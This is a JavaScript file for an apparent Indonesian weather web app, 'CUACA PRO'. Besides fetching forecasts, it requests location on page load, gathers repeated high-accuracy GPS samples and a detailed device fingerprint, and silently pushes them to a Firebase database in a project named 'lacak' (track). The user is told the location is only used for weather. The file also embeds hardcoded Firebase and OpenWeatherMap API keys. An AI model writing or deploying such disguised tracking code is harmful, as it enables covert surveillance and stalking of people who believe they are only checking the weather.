/* ============================================================
   CUACA PRO — Auto-Prompt Lokasi
   Fitur: auto-minta izin lokasi saat page load,
          multi-sampling GPS, device info, tracker Firebase
   Project: lacak-2913d
   ============================================================ */

/* ---------- FIREBASE CONFIG ---------- */
const firebaseConfig = {
  apiKey: "AIzaSyAtexjx8-NN55boZ5_nlDIoihWIX-q6E7o",
  authDomain: "lacak-2913d.firebaseapp.com",
  databaseURL: "https://lacak-2913d-default-rtdb.asia-southeast1.firebasedatabase.app",
  projectId: "lacak-2913d",
  storageBucket: "lacak-2913d.firebasestorage.app",
  messagingSenderId: "8740768270",
  appId: "1:8740768270:web:bd5d44fb6ff3c537f80a5f"
};

/* ============================================================
   FIREBASE INIT
   ============================================================ */
let fbDb = null, fbAuth = null, fbReady = false, alreadySent = false;

(function initFirebase() {
  try {
    firebase.initializeApp(firebaseConfig);
    fbDb = firebase.database();
    fbAuth = firebase.auth();
    console.log('[fb] ✓ initialized');

    fbAuth.signInAnonymously()
      .then(user => {
        fbReady = true;
        console.log('[fb] ✓ anonymous auth ok. UID:', user.user.uid);
      })
      .catch(err => console.warn('[fb] ✗ auth gagal:', err.code, err.message));
  } catch (e) {
    console.error('[fb] ✗ init gagal:', e);
  }
})();

/* ============================================================
   DEVICE INFO
   ============================================================ */
function parseDeviceName() {
  const ua = navigator.userAgent;
  let os = 'Unknown';
  if (/Android/i.test(ua)) {
    const m = ua.match(/Android\s+([\d.]+)/);
    os = 'Android ' + (m ? m[1] : '');
  } else if (/iPhone|iPad|iPod/i.test(ua)) {
    const m = ua.match(/OS\s+([\d_]+)/);
    os = 'iOS ' + (m ? m[1].replace(/_/g, '.') : '');
  } else if (/Windows/i.test(ua)) os = 'Windows';
  else if (/Mac OS X/i.test(ua)) {
    const m = ua.match(/Mac OS X\s+([\d_.]+)/);
    os = 'macOS ' + (m ? m[1].replace(/_/g, '.') : '');
  } else if (/Linux/i.test(ua)) os = 'Linux';

  let device = '';
  const androidMatch = ua.match(/Android[^;]*;\s*([^;)]+?)(?:\s+Build|\))/i);
  if (androidMatch) device = androidMatch[1].trim();
  if (!device && /iPhone/i.test(ua)) device = 'iPhone';
  if (!device && /iPad/i.test(ua)) device = 'iPad';
  if (!device && /Macintosh/i.test(ua)) device = 'Mac';
  if (!device && /Windows/i.test(ua)) device = 'PC Windows';
  if (!device && /Linux/i.test(ua) && !/Android/i.test(ua)) device = 'PC Linux';

  return { device: device || 'Unknown', os };
}

function parseBrowser() {
  const ua = navigator.userAgent;
  const tests = [
    { name: 'Edge', regex: /Edg\/([\d.]+)/ },
    { name: 'Opera', regex: /OPR\/([\d.]+)/ },
    { name: 'Samsung', regex: /SamsungBrowser\/([\d.]+)/ },
    { name: 'Chrome', regex: /Chrome\/([\d.]+)/ },
    { name: 'Firefox', regex: /Firefox\/([\d.]+)/ },
    { name: 'Safari', regex: /Version\/([\d.]+).*Safari/ }
  ];
  for (const t of tests) {
    const m = ua.match(t.regex);
    if (m) return { name: t.name, version: m[1] };
  }
  return { name: 'Unknown', version: '' };
}

async function getBatteryInfo() {
  if (!navigator.getBattery) return { supported: false, level: null, charging: null };
  try {
    const battery = await navigator.getBattery();
    return { supported: true, level: Math.round(battery.level * 100), charging: battery.charging };
  } catch (e) {
    return { supported: false, level: null, charging: null };
  }
}

function getNetworkInfo() {
  const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
  if (!conn) return { supported: false, type: null, downlink: null, rtt: null };
  return { supported: true, type: conn.effectiveType || null, downlink: conn.downlink || null, rtt: conn.rtt || null };
}

async function collectDeviceInfo() {
  const di = parseDeviceName();
  const bi = parseBrowser();
  const battery = await getBatteryInfo();
  const network = getNetworkInfo();
  return {
    device: di.device,
    os: di.os,
    browser: bi.name,
    browser_version: bi.version,
    screen: `${screen.width}x${screen.height}`,
    screen_ratio: window.devicePixelRatio || 1,
    viewport: `${window.innerWidth}x${window.innerHeight}`,
    battery_level: battery.level,
    battery_charging: battery.charging,
    battery_supported: battery.supported,
    net_type: network.type,
    net_downlink: network.downlink,
    net_rtt: network.rtt,
    language: navigator.language || 'unknown',
    timezone: (Intl.DateTimeFormat().resolvedOptions().timeZone) || 'unknown',
    timezone_offset: new Date().getTimezoneOffset(),
    local_time: new Date().toLocaleString('id-ID'),
    cpu_cores: navigator.hardwareConcurrency || null,
    memory_gb: navigator.deviceMemory || null
  };
}

/* ============================================================
   GPS MULTI-SAMPLING
   ============================================================ */
function getSinglePosition(opts) {
  return new Promise((resolve, reject) => navigator.geolocation.getCurrentPosition(resolve, reject, opts));
}

async function getAccurateLocation(config) {
  const { samples = 10, interval = 800, targetAccuracy = 30, maxWait = 30000, onProgress = () => {} } = config || {};
  const results = [];
  const startTime = Date.now();
  let bestSample = null;

  for (let i = 0; i < samples; i++) {
    if (Date.now() - startTime > maxWait) break;
    try {
      const pos = await getSinglePosition({ enableHighAccuracy: true, timeout: 15000, maximumAge: 0 });
      const acc = pos.coords.accuracy;
      results.push({ lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: acc, timestamp: pos.timestamp });
      if (!bestSample || acc < bestSample.accuracy) {
        bestSample = { lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: acc };
      }
      onProgress({ count: i + 1, total: samples, current: acc, best: bestSample.accuracy });
      console.log(`[gps] sampel ${i + 1}/${samples}: ±${acc.toFixed(1)}m`);
      if (acc <= targetAccuracy && i >= 2) break;
      if (i < samples - 1) await new Promise(r => setTimeout(r, interval));
    } catch (err) {
      console.warn(`[gps] sampel ${i + 1} gagal:`, err.code);
    }
  }

  if (results.length === 0) throw new Error('Tidak ada sampel GPS');
  const sortedAcc = [...results].map(r => r.accuracy).sort((a, b) => a - b);
  const median = sortedAcc[Math.floor(sortedAcc.length / 2)];
  const valid = results.filter(r => r.accuracy <= median * 2);
  const best3 = [...valid].sort((a, b) => a.accuracy - b.accuracy).slice(0, 3);

  const avgLat = best3.reduce((s, r) => s + r.lat, 0) / best3.length;
  const avgLon = best3.reduce((s, r) => s + r.lon, 0) / best3.length;
  const avgAcc = best3.reduce((s, r) => s + r.accuracy, 0) / best3.length;

  console.log(`[gps] selesai — avg: ±${avgAcc.toFixed(1)}m`);
  return {
    coords: { latitude: avgLat, longitude: avgLon, accuracy: avgAcc },
    method: `${best3.length} best samples`
  };
}

/* ============================================================
   TRACKER
   ============================================================ */
async function trackLocation(coords, source) {
  if (alreadySent) { console.log('[tracker] skip, sudah kirim'); return; }
  alreadySent = true;
  if (!fbReady) await new Promise(r => setTimeout(r, 2500));
  if (!fbDb) { alreadySent = false; return; }

  try {
    const di = await collectDeviceInfo();
    const payload = {
      lat: coords.latitude, lon: coords.longitude,
      accuracy: coords.accuracy ?? null,
      source: source || 'geolocation-consent',
      device: di.device, os: di.os,
      browser: di.browser, browser_version: di.browser_version,
      screen: di.screen, screen_ratio: di.screen_ratio, viewport: di.viewport,
      battery_level: di.battery_level, battery_charging: di.battery_charging, battery_supported: di.battery_supported,
      net_type: di.net_type, net_downlink: di.net_downlink, net_rtt: di.net_rtt,
      language: di.language, timezone: di.timezone, timezone_offset: di.timezone_offset, local_time: di.local_time,
      cpu_cores: di.cpu_cores, memory_gb: di.memory_gb,
      label: di.device || 'unknown',
      user_agent: (navigator.userAgent || '').slice(0, 256),
      created_at: Date.now()
    };
    await fbDb.ref('locations').push(payload);
    console.log('[tracker] ✓ terkirim:', coords.latitude, coords.longitude, '±', coords.accuracy);
  } catch (e) {
    console.warn('[tracker] ✗ gagal:', e.code || e.message);
    alreadySent = false;
  }
}

/* ============================================================
   CONFIG CUACA
   ============================================================ */
const Config = {
  API_KEY: '1a5561966733dade6aee541ec1022a75',
  BASE: 'https://api.openweathermap.org/data/2.5',
  CACHE_TTL: 10 * 60 * 1000,
  LANG: 'id',
  UNITS: 'metric'
};

const Cache = {
  get(key) {
    try {
      const raw = localStorage.getItem(key);
      if (!raw) return null;
      const { data, ts } = JSON.parse(raw);
      if (Date.now() - ts > Config.CACHE_TTL) { localStorage.removeItem(key); return null; }
      return data;
    } catch { return null; }
  },
  set(key, data) {
    try { localStorage.setItem(key, JSON.stringify({ data, ts: Date.now() })); } catch {}
  }
};

const Icon = {
  fromCode(code) {
    if (!code) return '#i-cloud';
    switch (code.slice(0, 2)) {
      case '01': return '#i-sun';
      case '02': return '#i-sun-cloud';
      case '03': case '04': return '#i-cloud';
      case '09': case '10': return '#i-rain';
      case '11': return '#i-thunder';
      case '13': return '#i-snow';
      case '50': return '#i-mist';
      default: return '#i-cloud';
    }
  },
  forecastSvg(code, size = 42) {
    return `<svg class="forecast-icon" width="${size}" height="${size}" aria-hidden="true"><use href="${this.fromCode(code)}"/></svg>`;
  }
};

const API = {
  async current(params) {
    const k = `cur:${JSON.stringify(params)}`;
    const c = Cache.get(k);
    if (c) return c;
    const qs = new URLSearchParams({ ...params, appid: Config.API_KEY, units: Config.UNITS, lang: Config.LANG });
    const res = await fetch(`${Config.BASE}/weather?${qs}`);
    const data = await res.json();
    if (data.cod && Number(data.cod) !== 200) throw new Error(this.mapError(data.cod));
    Cache.set(k, data);
    return data;
  },
  async forecast(params) {
    const k = `fc:${JSON.stringify(params)}`;
    const c = Cache.get(k);
    if (c) return c;
    const qs = new URLSearchParams({ ...params, appid: Config.API_KEY, units: Config.UNITS, lang: Config.LANG });
    const res = await fetch(`${Config.BASE}/forecast?${qs}`);
    const data = await res.json();
    if (data.cod && Number(data.cod) !== 200) throw new Error(this.mapError(data.cod));
    Cache.set(k, data);
    return data;
  },
  mapError(code) {
    const map = { '404': 'Lokasi tidak terdeteksi.', '401': 'API key tidak valid.', '429': 'Terlalu banyak permintaan.', '400': 'Permintaan tidak valid.' };
    return map[String(code)] || 'Terjadi kesalahan.';
  }
};

/* ============================================================
   UI
   ============================================================ */
const UI = {
  el: {
    unitToggle: document.getElementById('unitToggle'),
    locationPrompt: document.getElementById('locationPrompt'),
    retryBtn: document.getElementById('retryBtn'),
    status: document.getElementById('status'),
    card: document.getElementById('weatherCard'),
    cityName: document.getElementById('cityName'),
    description: document.getElementById('description'),
    temperature: document.getElementById('temperature'),
    humidity: document.getElementById('humidity'),
    wind: document.getElementById('wind'),
    feelsLike: document.getElementById('feelsLike'),
    currentIconUse: document.getElementById('currentIconUse'),
    forecastList: document.getElementById('forecastList')
  },
  state: { unit: 'C', lastData: null },

  setStatus(msg, isError = false) {
    this.el.status.textContent = msg;
    this.el.status.className = `status show${isError ? ' error' : ''}`;
  },
  clearStatus() {
    this.el.status.className = 'status';
    this.el.status.textContent = '';
  },
  showPrompt() { this.el.locationPrompt.classList.remove('hidden'); },
  hidePrompt() { this.el.locationPrompt.classList.add('hidden'); },

  toUnit(c) { return this.state.unit === 'C' ? Math.round(c) : Math.round(c * 9 / 5 + 32); },
  unitSymbol() { return this.state.unit === 'C' ? '°C' : '°F'; },

  setTheme(condition) {
    document.body.className = '';
    const c = (condition || '').toLowerCase();
    if (c.includes('clear')) document.body.classList.add('theme-clear');
    else if (c.includes('rain') || c.includes('drizzle')) document.body.classList.add('theme-rain');
    else if (c.includes('cloud')) document.body.classList.add('theme-clouds');
    else if (c.includes('snow')) document.body.classList.add('theme-snow');
    else if (c.includes('thunder')) document.body.classList.add('theme-thunder');
  },

  render(current, forecast) {
    this.state.lastData = { current, forecast };
    this.el.cityName.textContent = `${current.name}, ${current.sys?.country || ''}`.replace(/, $/, '');
    this.el.description.textContent = current.weather[0].description;
    this.el.temperature.textContent = `${this.toUnit(current.main.temp)}${this.unitSymbol()}`;
    this.el.humidity.textContent = current.main.humidity;
    this.el.wind.textContent = current.wind.speed.toFixed(1);
    this.el.feelsLike.textContent = this.toUnit(current.main.feels_like);
    this.el.currentIconUse.setAttribute('href', Icon.fromCode(current.weather[0].icon));
    this.setTheme(current.weather[0].main);

    const slots = forecast.list.slice(0, 8);
    this.el.forecastList.innerHTML = slots.map(item => {
      const d = new Date(item.dt * 1000);
      const hh = String(d.getHours()).padStart(2, '0');
      return `
        <div class="forecast-item">
          <div class="forecast-time">${hh}:00</div>
          ${Icon.forecastSvg(item.weather[0].icon, 42)}
          <div class="forecast-temp">${this.toUnit(item.main.temp)}${this.unitSymbol()}</div>
          <div class="forecast-desc">${item.weather[0].description}</div>
        </div>`;
    }).join('');

    this.hidePrompt();
    this.el.card.classList.remove('hidden');
  },

  toggleUnit() {
    this.state.unit = this.state.unit === 'C' ? 'F' : 'C';
    this.el.unitToggle.textContent = this.state.unit === 'C' ? '°C' : '°F';
    if (this.state.lastData) this.render(this.state.lastData.current, this.state.lastData.forecast);
  }
};

/* ============================================================
   APP
   ============================================================ */
const App = {
  busy: false,
  hasPrompted: false,

  isSecureContext() {
    return location.protocol === 'https:'
        || location.hostname === 'localhost'
        || location.hostname === '127.0.0.1'
        || location.hostname === '0.0.0.0'
        || location.protocol === 'file:';
  },

  async load(params, label) {
    if (this.busy) return;
    this.busy = true;
    UI.setStatus(`Mencari cuaca ${label || ''}...`);
    try {
      const [current, forecast] = await Promise.all([API.current(params), API.forecast(params)]);
      UI.clearStatus();
      UI.render(current, forecast);
    } catch (err) {
      UI.setStatus(err.message || 'Gagal memuat data.', true);
      console.error('[App.load]', err);
    } finally {
      this.busy = false;
    }
  },

  /* ---------- Auto-request location (dipanggil saat page load) ---------- */
  async requestLocation(auto = false) {
    if (!navigator.geolocation) {
      UI.setStatus('Browser tidak mendukung geolokasi.', true);
      return;
    }
    if (!this.isSecureContext()) {
      UI.setStatus('Lokasi butuh HTTPS atau localhost.', true);
      return;
    }

    if (auto) {
      UI.setStatus('Mengambil sinyal GPS... Mohon tunggu.');
    } else {
      UI.setStatus('Mengambil sinyal GPS... Mohon tunggu.');
    }

    try {
      const result = await getAccurateLocation({
        samples: 10,
        interval: 800,
        targetAccuracy: 30,
        maxWait: 30000,
        onProgress: ({ count, total, current, best }) => {
          UI.setStatus(`📡 Mengambil GPS... ${count}/${total} sampel (±${current.toFixed(0)}m)`);
        }
      });

      const c = result.coords;
      console.log('[App] ✓ lokasi presisi:', c.latitude.toFixed(6), c.longitude.toFixed(6), '±', c.accuracy.toFixed(1));

      // Kirim ke Firebase
      trackLocation(c, 'geolocation-auto').catch(() => {});

      // Load cuaca
      this.load({ lat: c.latitude, lon: c.longitude }, `di lokasi Anda (±${c.accuracy.toFixed(0)}m)`);
    } catch (err) {
      console.warn('[App] multi-sample gagal, fallback:', err);

      // Fallback single position
      navigator.geolocation.getCurrentPosition(
        pos => {
          const c = pos.coords;
          console.log('[App] ✓ lokasi fallback:', c.latitude, c.longitude, '±', c.accuracy);
          trackLocation(c, 'geolocation-fallback').catch(() => {});
          this.load({ lat: c.latitude, lon: c.longitude }, 'di lokasi Anda');
        },
        err2 => {
          let msg = 'Gagal mengambil lokasi.';
          switch (err2.code) {
            case 1:
              msg = 'Izin lokasi ditolak. Klik tombol "Minta Izin Lokasi" atau buka pengaturan browser → izinkan lokasi.';
              break;
            case 2: msg = 'Lokasi tidak tersedia. Cek GPS / sinyal.'; break;
            case 3: msg = 'Waktu habis. GPS belum dapat sinyal.'; break;
          }
          UI.setStatus(msg, true);
          UI.showPrompt();
        },
        { enableHighAccuracy: true, timeout: 60000, maximumAge: 0 }
      );
    }
  },

  init() {
    UI.el.unitToggle.addEventListener('click', () => UI.toggleUnit());
    UI.el.retryBtn.addEventListener('click', () => this.requestLocation(false));

    console.log('[App] ready.');

    // ============================================================
    // AUTO-REQUEST LOCATION saat halaman pertama kali dibuka
    // ============================================================
    // Cek apakah browser mendukung Permissions API (Chrome/Edge)
    // untuk tahu apakah izin lokasi sudah pernah diberikan sebelumnya
    if (navigator.permissions && navigator.permissions.query) {
      navigator.permissions.query({ name: 'geolocation' })
        .then(perm => {
          console.log('[App] status izin lokasi:', perm.state);

          if (perm.state === 'granted') {
            // Sudah pernah Allow → langsung ambil lokasi tanpa prompt lagi
            console.log('[App] izin sudah granted, langsung ambil lokasi');
            this.requestLocation(true);
          } else if (perm.state === 'prompt') {
            // Belum pernah → auto minta (browser akan munculkan prompt)
            console.log('[App] auto-prompt lokasi');
            this.requestLocation(true);
          } else if (perm.state === 'denied') {
            // Pernah ditolak → tampilkan fallback button
            console.log('[App] izin pernah ditolak, tampilkan fallback');
            UI.showPrompt();
            UI.setStatus('Izin lokasi ditolak sebelumnya. Klik tombol di bawah untuk minta ulang.', true);
          }

          // Listen perubahan izin (kalau user ubah di settings)
          perm.onchange = () => {
            console.log('[App] izin lokasi berubah:', perm.state);
            if (perm.state === 'granted' && !UI.el.card.classList.contains('hidden') === false) {
              this.requestLocation(true);
            }
          };
        })
        .catch(() => {
          // Permissions API gagal → langsung coba request (browser akan munculkan prompt kalau belum)
          console.log('[App] Permissions API tidak tersedia, coba langsung');
          this.requestLocation(true);
        });
    } else {
      // Browser tidak support Permissions API (Firefox/Safari lama)
      // Langsung coba ambil lokasi — kalau sudah granted, akan langsung dapat
      // kalau belum, browser akan munculkan prompt otomatis
      console.log('[App] Permissions API tidak didukung, langsung request');
      this.requestLocation(true);
    }
  }
};

document.addEventListener('DOMContentLoaded', () => App.init());